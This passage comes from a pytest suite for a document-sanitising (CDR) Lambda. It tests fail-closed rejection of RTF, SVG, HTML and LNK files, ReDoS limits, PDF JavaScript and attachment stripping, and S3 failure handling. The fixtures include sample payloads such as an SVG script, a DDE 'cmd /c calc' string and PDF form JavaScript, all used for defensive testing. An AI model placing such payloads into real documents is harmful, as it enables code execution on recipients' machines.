        assert upload_bucket != cdr.SANITISED_BUCKET
        # The result published to SNS is 'unsupported-format', not 'sanitised'.
        assert mock_pub.call_args[0][2] == "unsupported-format"
        mock_s3.delete_object.assert_called_once_with(Bucket="src-bucket", Key="archive.tar.gz")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_active_content_carriers_never_sanitised(self, mock_dl, mock_ul, mock_pub, mock_s3):
        """RTF, SVG, HTML, LNK — active-content carriers — must fail closed, never land in
        SANITISED_BUCKET. Regression for the fail-open passthrough vulnerability."""
        mock_s3.delete_object.return_value = {}
        for key, payload in (
            ("doc.rtf", b"{\\rtf1 {\\object ...}}"),
            ("img.svg", b"<svg onload=\"alert(1)\"><script>evil()</script></svg>"),
            ("page.html", b"<html><script>evil()</script></html>"),
            ("shortcut.lnk", b"\x4c\x00\x00\x00"),
        ):
            mock_ul.reset_mock(); mock_pub.reset_mock()
            mock_dl.return_value = (payload, "application/octet-stream")
            result = cdr.handler(self._event("src-bucket", key), None)
            assert result["status"] == "unsupported-format", f"{key} not failed closed"
            for call in mock_ul.call_args_list:
                assert call[0][0] != cdr.SANITISED_BUCKET, f"{key} reached SANITISED_BUCKET"
            assert mock_pub.call_args[0][2] == "unsupported-format"


class TestRtfDeliberatelyFailClosed:
    """RTF is rejected BY DESIGN, not by accident. Its threats (embedded/linked OLE,
    remote-template refs, control words a forgiving parser acts on — CVE-2017-0199,
    CVE-2017-11882, CVE-2023-21716) are parser-divergent structure that a reconstruction
    pass cannot guarantee away. These tests pin the decision so a future contributor
    cannot silently add an RTF handler without the test going red."""

    def _event(self, key: str) -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 1024}}}

    def test_rtf_is_in_fail_closed_set(self):
        assert "rtf" in cdr.FAIL_CLOSED_EXTS
        assert "rtf" not in cdr.OFFICE_EXTS

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_rtf_fails_closed_even_if_added_to_office_exts(
        self, mock_dl, mock_ul, mock_pub, mock_s3
    ):
        """Belt-and-braces: the explicit FAIL_CLOSED_EXTS check must reject RTF even if a
        future edit wrongly adds 'rtf' to OFFICE_EXTS. RTF must never reach cdr_office()."""
        mock_dl.return_value = (b"{\\rtf1 {\\object \\objupdate ...}}", "application/rtf")
        mock_s3.delete_object.return_value = {}
        with patch.object(cdr, "OFFICE_EXTS", cdr.OFFICE_EXTS | {"rtf"}), \
             patch.object(cdr, "cdr_office", side_effect=AssertionError("cdr_office reached")):
            result = cdr.handler(self._event("memo.rtf"), None)
        assert result["status"] == "unsupported-format"
        for call in mock_ul.call_args_list:
            assert call[0][0] != cdr.SANITISED_BUCKET
        assert mock_pub.call_args[0][2] == "unsupported-format"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="memo.rtf")


class TestReDoSBounded:
    """The DDE pipe and numeric-entity-run patterns must not exhibit super-linear
    backtracking — a single crafted text node could otherwise hang the Lambda past its
    300 s timeout and form an EventBridge retry loop (remote upload-only DoS)."""

    def test_numeric_entity_run_no_redos(self):
        # Long alphabetic run with no '&#...;' reference — the old two-star pattern was
        # O(n^2) here. Must complete near-instantly and leave the text unchanged.
        s = b"<w:t>" + b"A" * 200000 + b"</w:t>"
        t = time.time()
        clean, removed = cdr._strip_xml_macros(s, "doc.xml")
        assert time.time() - t < 1.0
        assert clean == s
        assert removed == []

    def test_dde_pipe_no_redos(self):
        # `a…|b…` with no '!alnum' suffix — the old unbounded quantifiers backtracked
        # quadratically. Must complete fast.
        s = b"<w:t>" + b"a" * 128000 + b"|" + b"b" * 128000 + b"</w:t>"
        t = time.time()
        cdr._strip_xml_macros(s, "doc.xml")
        assert time.time() - t < 1.0

    def test_redos_fixes_preserve_correctness(self):
        # Real threats still neutralised after the ReDoS hardening.
        c, _ = cdr._strip_xml_macros('&#68;&#68;&#69; http://evil'.encode(), "d.xml")
        assert b"_CDR_REMOVED_" in c and b"DDE" not in c
        c, _ = cdr._strip_xml_macros('<w:t>"cmd"| \' /c calc\'!A1</w:t>'.encode(), "d.xml")
        assert b"_CDR_REMOVED_" in c
        # Benign escapes and plain text untouched.
        c, removed = cdr._strip_xml_macros('<w:t>AT&amp;T deal</w:t>'.encode(), "d.xml")
        assert c == '<w:t>AT&amp;T deal</w:t>'.encode() and removed == []


class TestHandlerExtended:

    def _event(self, bucket: str, key: str, size: int = 1024) -> dict:
        return {
            "detail": {
                "bucket": {"name": bucket},
                "object": {"key": key, "size": size},
            }
        }

    @patch.object(cdr, "s3")
    def test_legacy_doc_quarantined_and_deleted(self, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"\xd0\xcf\x11\xe0LEGACY"),
            "ContentType": "application/msword",
        }
        mock_s3.put_object.return_value = {}
        mock_s3.delete_object.return_value = {}

        with patch.object(cdr, "_publish_result_safe") as mock_pub:
            result = cdr.handler(self._event("src", "report.doc"), None)

        assert result["status"] == "unsupported-format"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="report.doc")
        mock_pub.assert_called_once()
        call_args = mock_pub.call_args[0]
        assert call_args[2] == "unsupported-format"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_xlsm_handler_remaps_extension(self, mock_dl, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types"></Types>')
            z.writestr("_rels/.rels",
                       '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                       'openxmlformats.org/package/2006/relationships"/>')
            z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("xl/workbook.xml", "<workbook/>")
        mock_dl.return_value = (buf.getvalue(),
                                "application/vnd.ms-excel.sheet.macroEnabled.12")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "uploads/data.xlsm"), None)

        assert result["status"] == "sanitised"
        assert result["destination"].endswith(".xlsx"), \
            f"Expected .xlsx destination, got: {result['destination']}"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="uploads/data.xlsm")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_report_includes_original_ext(self, mock_dl, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types"></Types>')
            z.writestr("_rels/.rels",
                       '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                       'openxmlformats.org/package/2006/relationships"/>')
            z.writestr("xl/workbook.xml", "<workbook/>")
        mock_dl.return_value = (buf.getvalue(),
                                "application/vnd.ms-excel.sheet.macroEnabled.12")
        mock_s3.delete_object.return_value = {}

        cdr.handler(self._event("src", "uploads/data.xlsm"), None)

        payload = mock_pub.call_args[0][3]
        assert payload.get("original_ext") == "xlsm"
        assert payload.get("sanitised_ext") == "xlsx"


# ── Additional security regression tests ──────────────────────────────────────

class TestAcroFormJSSweep:
    """AcroForm field/widget JavaScript is recursively removed."""

    def _make_pdf_with_acroform_js(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))

        field = pdf.make_indirect(pikepdf.Dictionary(
            T=pikepdf.String("field1"),
            FT=pikepdf.Name("/Tx"),
            AA=pikepdf.Dictionary(
                K=pikepdf.Dictionary(
                    S=pikepdf.Name("/JavaScript"),
                    JS=pikepdf.String("app.alert('xss');"),
                )
            ),
            JS=pikepdf.String("app.alert('direct_js');"),
        ))
        pdf.Root["/AcroForm"] = pikepdf.Dictionary(
            Fields=pikepdf.Array([field]),
        )
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_acroform_field_aa_stripped(self):
        clean, report = cdr.cdr_pdf(self._make_pdf_with_acroform_js())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            acroform = pdf.Root.get("/AcroForm")
            assert acroform is not None, "AcroForm container was dropped entirely"
            for field in acroform.get("/Fields", []):
                assert "/AA" not in field, "/AA still present in AcroForm field"
                assert "/JS" not in field, "/JS still present in AcroForm field"

    def test_acroform_sweep_recorded_in_report(self):
        _, report = cdr.cdr_pdf(self._make_pdf_with_acroform_js())
        assert any("AcroForm" in r for r in report["removed"]), \
            "AcroForm field sweep not recorded in report"

    # ── Audit fix: a malicious cyclic /Kids chain must not cause unbounded recursion
    #    (stack overflow / DoS) — mirrors the existing /Next cycle guard on outlines ──
    def test_acroform_cyclic_kids_does_not_hang(self):
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))

        field_a = pdf.make_indirect(pikepdf.Dictionary(T=pikepdf.String("a"), FT=pikepdf.Name("/Tx")))
        field_b = pdf.make_indirect(pikepdf.Dictionary(T=pikepdf.String("b"), FT=pikepdf.Name("/Tx")))
        field_a["/Kids"] = pikepdf.Array([field_b])
        field_b["/Kids"] = pikepdf.Array([field_a])  # cycle: a -> b -> a -> ...

        pdf.Root["/AcroForm"] = pikepdf.Dictionary(Fields=pikepdf.Array([field_a]))
        buf = io.BytesIO()
        pdf.save(buf)

        clean, _ = cdr.cdr_pdf(buf.getvalue())  # must return promptly, not hang/crash
        assert clean

    # ── Audit fix: a fixed recursion-depth cutoff silently stopped the sweep partway
    #    through a legitimately deep (non-cyclic) /Kids chain, leaving deeper fields'
    #    /JS un-stripped while returning normally. The walk is now iterative and must
    #    fully sweep chains far deeper than the old depth cutoff (1000) ──
    def test_acroform_deep_noncyclic_kids_fully_swept(self):
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))

        depth = 5000
        prev = None
        for i in range(depth):
            field = pdf.make_indirect(pikepdf.Dictionary(
                T=pikepdf.String(f"f{i}"),
                FT=pikepdf.Name("/Tx"),
                JS=pikepdf.String("app.alert('xss');"),
            ))
            if prev is not None:
                field["/Kids"] = pikepdf.Array([prev])
            prev = field

        pdf.Root["/AcroForm"] = pikepdf.Dictionary(Fields=pikepdf.Array([prev]))
        buf = io.BytesIO()
        pdf.save(buf)
        buf.seek(0)

        with pikepdf.open(buf) as pdf2:
            removed = cdr._strip_acroform_fields(pdf2.Root["/AcroForm"].get("/Fields", []))
        assert len(removed) == depth, \
            f"only {len(removed)}/{depth} fields swept — deep chain silently truncated"

    def _kids_chain_pdf(self, depth):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        prev = None
        for i in range(depth):
            field = pdf.make_indirect(pikepdf.Dictionary(
                T=pikepdf.String(f"f{i}"),
                FT=pikepdf.Name("/Tx"),
                JS=pikepdf.String("app.alert('CAPTAIL');"),
            ))
            if prev is not None:
                field["/Kids"] = pikepdf.Array([prev])
            prev = field
        pdf.Root["/AcroForm"] = pikepdf.Dictionary(Fields=pikepdf.Array([prev]))
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)
        return buf.getvalue()

    # ── Audit fix: the field-tree cap `break`ed, abandoning the rest of the /Kids chain
    #    while cdr_pdf still reported the file sanitised. Same failure direction as the
    #    outline cap and _walk_pdf_nodes — bound the work, but fail closed (pitfall #59) ──
    def test_acroform_walk_cap_rejects_rather_than_truncating(self, monkeypatch):
        monkeypatch.setattr(cdr, "_MAX_WALK_NODES", 10)
        raw = self._kids_chain_pdf(40)
        assert b"CAPTAIL" in raw  # precondition: payload really is in the input
        with pytest.raises(cdr.CdrReject, match="walk cap"):
            cdr.cdr_pdf(raw)

    def test_acroform_walk_cap_payload_never_ships(self, monkeypatch):
        """Pins the outcome, not the exception."""
        monkeypatch.setattr(cdr, "_MAX_WALK_NODES", 10)
        raw = self._kids_chain_pdf(40)
        try:
            clean, _ = cdr.cdr_pdf(raw)
        except cdr.CdrReject:
            return
        assert b"CAPTAIL" not in clean, \
            "over-cap AcroForm field actions survived into the sanitised output"


class TestPdfNamesEmbeddedFiles:
    """PDF /Names./EmbeddedFiles is removed."""

    def _make_pdf_with_embedded_file(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))

        embedded = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Filespec"),
            F=pikepdf.String("malware.exe"),
        ))
        pdf.Root["/Names"] = pikepdf.Dictionary(
            EmbeddedFiles=pikepdf.Dictionary(
                Names=pikepdf.Array([pikepdf.String("malware.exe"), embedded])
            )
        )
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_embedded_files_removed(self):
        clean, report = cdr.cdr_pdf(self._make_pdf_with_embedded_file())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            if "/Names" in pdf.Root:
                assert "/EmbeddedFiles" not in pdf.Root["/Names"], \
                    "/Names./EmbeddedFiles still present after CDR"
        assert any("EmbeddedFiles" in r for r in report["removed"])


class TestAcroFormRootAA:
    """/AA (Additional Actions) on the AcroForm root dict must be stripped — not just
    catalog['/AA'] and per-field /AA."""

    def _make_pdf(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        pdf.Root["/AcroForm"] = pikepdf.Dictionary(
            Fields=pikepdf.Array([]),
            AA=pikepdf.Dictionary(
                C=pikepdf.Dictionary(  # calculate action
                    S=pikepdf.Name("/JavaScript"),
                    JS=pikepdf.String("app.alert('calc');"),
                )
            ),
        )
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_acroform_root_aa_stripped(self):
        clean, report = cdr.cdr_pdf(self._make_pdf())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            acroform = pdf.Root.get("/AcroForm")
            assert acroform is not None, "AcroForm container was dropped entirely"
            assert "/AA" not in acroform, "/AA still present on AcroForm root"
        assert any("AcroForm/AA" in r for r in report["removed"])


class TestPdfFileAttachment:
    """Page-level /FileAttachment annotations smuggle embedded files past the catalog-level
    /Names./EmbeddedFiles strip. Their file specification (/FS, /EF) must be scrubbed."""

    def _make_pdf(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        ef_stream = pdf.make_stream(b"MZ\x90\x00malware-bytes")
        filespec = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Filespec"),
            F=pikepdf.String("payload.exe"),
            EF=pikepdf.Dictionary(F=ef_stream),
        ))
        annot = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"),
            Subtype=pikepdf.Name("/FileAttachment"),
            Rect=pikepdf.Array([0, 0, 20, 20]),
            FS=filespec,
        ))
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_file_attachment_filespec_scrubbed(self):
        clean, report = cdr.cdr_pdf(self._make_pdf())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            for page in pdf.pages:
                for annot in page.get("/Annots", []):
                    if annot.get("/Subtype") == "/FileAttachment":
                        assert "/FS" not in annot, "/FS still present on FileAttachment"
                        assert "/EF" not in annot, "/EF still present on FileAttachment"
        assert any("FileAttachment" in r for r in report["removed"])


class TestXlsbConversionPolicy:
    """xlsb files with sheet binaries are converted to xlsx — not quarantined.
    The handler routes the output to the sanitised bucket and deletes the source."""

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_xlsb_handler_sanitises_not_quarantines(self, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(_make_xlsb()),
            "ContentType": "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
        }
        mock_s3.put_object.return_value = {}
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(
            {"detail": {"bucket": {"name": "src"}, "object": {"key": "data.xlsb", "size": 512}}},
            None,
        )

        assert result["status"] == "sanitised"
        # Output key must be remapped to .xlsx
        assert result["destination"].endswith(".xlsx"), \
            f"Expected .xlsx destination, got: {result['destination']}"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_xlsb_source_deleted_after_sanitise(self, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(_make_xlsb()),
            "ContentType": "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
        }
        mock_s3.put_object.return_value = {}
        mock_s3.delete_object.return_value = {}

        cdr.handler(
            {"detail": {"bucket": {"name": "src"}, "object": {"key": "data.xlsb", "size": 512}}},
            None,
        )
        mock_s3.delete_object.assert_called_once()

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_xlsb_output_is_valid_xlsx(self, mock_pub, mock_s3):
        """Sanitised xlsb produces valid xlsx bytes written to the sanitised bucket."""
        captured = {}

        def capture_put(**kwargs):
            if kwargs.get("Bucket") == "test-sanitised":
                captured["body"] = kwargs["Body"]
            return {}

        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(_make_xlsb(rows=[[7.0, 8.0]])),
            "ContentType": "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
        }
        mock_s3.put_object.side_effect = capture_put
        mock_s3.delete_object.return_value = {}

        cdr.handler(
            {"detail": {"bucket": {"name": "src"}, "object": {"key": "report.xlsb", "size": 512}}},
            None,
        )

        assert "body" in captured, "Nothing written to sanitised bucket"
        wb = openpyxl.load_workbook(io.BytesIO(captured["body"]))
        ws = wb.active
        assert ws.cell(1, 1).value == pytest.approx(7.0)
        assert ws.cell(1, 2).value == pytest.approx(8.0)


class TestOversizedCopyObject:
    """Oversized files use copy_object to quarantine — evidence preserved, source kept."""

    def _event(self, bucket: str, key: str, size: int) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": size}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_oversized_uses_copy_object(self, mock_pub, mock_s3):
        mock_s3.copy_object.return_value = {}

        result = cdr.handler(self._event("src", "big.docx", 200 * 1024 * 1024), None)

        assert result["status"] == "rejected"
        mock_s3.copy_object.assert_called_once()
        call_kwargs = mock_s3.copy_object.call_args[1]
        assert call_kwargs["Bucket"] == "test-quarantine"
        assert "big.docx" in call_kwargs["Key"]

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_oversized_does_not_delete_source(self, mock_pub, mock_s3):
        mock_s3.copy_object.return_value = {}

        cdr.handler(self._event("src", "big.docx", 200 * 1024 * 1024), None)

        mock_s3.delete_object.assert_not_called()


class TestZipRejectionDeletesSource:
    """ZIP validation hard-reject deletes source object to prevent retry loops."""

    def _event(self, bucket: str, key: str) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    def test_bad_magic_deletes_source(self, mock_ul, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"NOT_A_ZIP_FILE" + b"\x00" * 100),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="evil.docx")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    def test_duplicate_entry_deletes_source(self, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", b"<doc/>")
            z.writestr("word/document.xml", b"<evil/>")
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(buf.getvalue()),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="evil.docx")


class TestQuarantineFailureDoesNotDeleteSource:
    """Audit fix: if the quarantine upload fails, the source must NOT be deleted — it is
    the only remaining copy of an unprocessable file. Never destroy the only copy."""

    def _event(self, bucket: str, key: str) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    def test_quarantine_upload_failure_keeps_source(self, mock_ul, mock_pub, mock_s3):
        mock_ul.side_effect = Exception("simulated S3 outage")
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"NOT_A_ZIP_FILE" + b"\x00" * 100),
            "ContentType": "application/octet-stream",
        }

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_s3.delete_object.assert_not_called()

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    def test_quarantine_upload_success_still_deletes_source(self, mock_ul, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"NOT_A_ZIP_FILE" + b"\x00" * 100),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="evil.docx")


class TestZipAnomalyMetricEmitted:
    """A ZIP structural hard-reject must emit the CDR/Validation/ZipAnomalies metric so
    ops has visibility into structural attacks (the documented behaviour)."""

    def _event(self, bucket: str, key: str) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_emit_zip_anomaly_metric")
    def test_bad_magic_emits_zip_anomaly_metric(self, mock_metric, mock_ul, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"NOT_A_ZIP_FILE" + b"\x00" * 100),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_metric.assert_called_once()

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_emit_zip_anomaly_metric")
    def test_duplicate_entry_emits_zip_anomaly_metric(self, mock_metric, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", b"<doc/>")
            z.writestr("word/document.xml", b"<evil/>")
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(buf.getvalue()),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_metric.assert_called_once()


class TestDownloadContentLengthGuard:
    """_download refuses to buffer an object whose S3 ContentLength exceeds the limit,
    defending against a post-event object swap (the EventBridge size field is stale)."""

    @patch.object(cdr, "s3")
    def test_oversized_content_length_raises(self, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"x"),
            "ContentType": "application/octet-stream",
            "ContentLength": cdr._MAX_FILE_BYTES + 1,
        }
        with pytest.raises(ValueError):
            cdr._download("src", "swapped.docx")

    @patch.object(cdr, "s3")
    def test_normal_content_length_passes(self, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"hello"),
            "ContentType": "text/plain",
            "ContentLength": 5,
        }
        data, ct = cdr._download("src", "ok.txt")
        assert data == b"hello"


class TestCdrModeTag:
    """Sanitised uploads carry cdr-mode=full."""

    def _event(self, bucket: str, key: str) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_docx_upload_has_full_mode_tag(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "report.docx"), None)

        assert result["status"] == "sanitised"
        upload_call = mock_ul.call_args
        tags = upload_call[0][4]
        assert tags.get("cdr-mode") == "full"


class TestActiveXContentTypesRemoved:
    """activeX content-type Override entries are removed from [Content_Types].xml."""

    def _make_activex_content_types(self) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.activeX"/>'
            '<Override PartName="/xl/activeX/activeX1.xml"'
            ' ContentType="application/vnd.ms-office.activeX+xml"/>'
            '<Override PartName="/xl/workbook.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"/>'
            '</Types>'
        ).encode()

    def test_activex_default_removed(self):
        clean, removed = cdr._sanitise_content_types(self._make_activex_content_types())
        assert b"activeX" not in clean, "activeX Default content-type not removed"
        assert any("activex" in r.lower() for r in removed)

    def test_activex_override_removed(self):
        clean, removed = cdr._sanitise_content_types(self._make_activex_content_types())
        assert b"activeX+xml" not in clean, "activeX+xml Override content-type not removed"

    def test_clean_override_preserved(self):
        clean, _ = cdr._sanitise_content_types(self._make_activex_content_types())
        assert b"spreadsheetml.sheet" in clean, "clean workbook content-type incorrectly removed"


# ── Production failure-path tests ─────────────────────────────────────────────

class TestSnsFailureDoesNotBlockSuccess:
    """SNS publish failure must not prevent source deletion or success response."""

    def _event(self, key: str = "report.docx") -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_sns_failure_still_returns_sanitised(self, mock_dl, mock_ul, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/octet-stream")
        mock_s3.delete_object.return_value = {}
        # Simulate SNS being down
        mock_s3.publish = MagicMock(side_effect=Exception("SNS unavailable"))

        with patch.object(cdr, "sns") as mock_sns:
            mock_sns.publish.side_effect = Exception("SNS unavailable")
            result = cdr.handler(self._event(), None)

        assert result["status"] == "sanitised"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_sns_failure_still_deletes_source(self, mock_dl, mock_ul, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/octet-stream")
        mock_s3.delete_object.return_value = {}

        with patch.object(cdr, "sns") as mock_sns:
            mock_sns.publish.side_effect = Exception("SNS unavailable")
            cdr.handler(self._event(), None)

        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="report.docx")


class TestDeleteFailureDoesNotMaskSuccess:
    """delete_object failure must not cause the Lambda to return an error."""

    def _event(self, key: str = "report.docx") -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_delete_failure_returns_sanitised(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/octet-stream")
        mock_s3.delete_object.side_effect = Exception("AccessDenied")

        result = cdr.handler(self._event(), None)

        assert result["status"] == "sanitised", \
            "delete_object failure should not change the success response"


class TestNoSuchKeyDownload:
    """NoSuchKey on download should publish source-missing and not quarantine."""

    def _event(self, key: str = "report.docx") -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_nosuchkey_publishes_source_missing(self, mock_pub, mock_s3):
        from botocore.exceptions import ClientError
        mock_s3.get_object.side_effect = ClientError(
            {"Error": {"Code": "NoSuchKey", "Message": "Not Found"}}, "GetObject"
        )

        with pytest.raises(ClientError):
            cdr.handler(self._event(), None)

        # Should publish source-missing, not "error"
        statuses = [call.args[2] for call in mock_pub.call_args_list]
        assert "source-missing" in statuses, \
            f"Expected source-missing in published statuses, got {statuses}"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_nosuchkey_does_not_quarantine(self, mock_pub, mock_s3):
        from botocore.exceptions import ClientError
        mock_s3.get_object.side_effect = ClientError(
